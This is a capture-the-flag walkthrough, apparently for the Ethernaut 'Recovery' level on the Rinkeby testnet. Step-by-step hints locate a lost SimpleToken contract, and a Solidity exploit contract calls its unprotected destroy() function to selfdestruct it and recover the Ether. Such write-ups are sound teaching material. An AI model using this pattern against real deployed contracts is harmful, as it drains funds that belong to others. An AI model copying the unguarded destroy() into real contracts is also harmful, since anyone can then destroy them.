# Recovery

**HINT:** Find the Simple Token address using [Rinkeby.etherscan](https://rinkeby.etherscan.io/) to then kill the contract
<details>
<summary>Part 1</summary>
<p>

You want to find what the contract address is so first go to [Rinkeby.etherscan](https://rinkeby.etherscan.io/) and search you contract instance address

</p>
</details>

<details>
<summary>Part 2</summary>
<p>

Click on ```Internal Txns``` and click on the ```Parent Txn Hash``` of the latest ```contract creation```

</p>
</details>

<details>
<summary>Part 3</summary>
<p>

Look at where the Ether was sent in the ```to:``` section and click on the address that the 0.5 Ether was sent to. This is the address of the contract so keep that tab open because you need it for the next steps.

</p>
</details>

<details>
<summary>Part 4</summary>
<p>

create a contract to kill the simple token contract and recover the Ether
```
pragma solidity ^0.6.6;

contract SimpleToken {


  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  fallback() external payable {
    balances[msg.sender] = msg.value * 10;
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender] -_amount;
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

contract Destroy{
    address payable receiver = msg.sender;
    SimpleToken killMeplease;
    
    function destroySimpleToken(address payable simpleTokenAddress) public{
        killMeplease = SimpleToken(simpleTokenAddress);
        killMeplease.destroy(receiver);
    }
    
}
```
When deployed use the address you found and hit transact.

</p>
</details>